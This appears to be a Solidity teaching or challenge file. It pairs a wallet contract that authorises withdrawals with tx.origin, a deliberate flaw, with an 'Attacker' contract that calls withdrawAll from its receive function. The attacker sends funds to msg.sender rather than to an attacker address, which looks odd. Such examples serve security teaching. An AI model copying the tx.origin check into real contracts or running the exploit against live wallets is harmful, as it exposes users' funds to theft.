// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract SmallWallet 
{
  address public owner;

  constructor() 
  {
    owner = tx.origin;
  }

  function withdrawAll(address _recipient) external 
  {
    require(tx.origin == owner, "Caller not authorized");
    payable(_recipient).transfer(address(this).balance);
  }

  receive() external payable {}
}

interface ISmallWallet 
{
  function withdrawAll(address _recipient) external; 
}

contract Attacker
{
  ISmallWallet private immutable smallWallet;

  constructor(ISmallWallet _smallWallet) 
  {
    smallWallet = _smallWallet;
  }

  receive() external payable 
  {
    smallWallet.withdrawAll(msg.sender);
  }
}
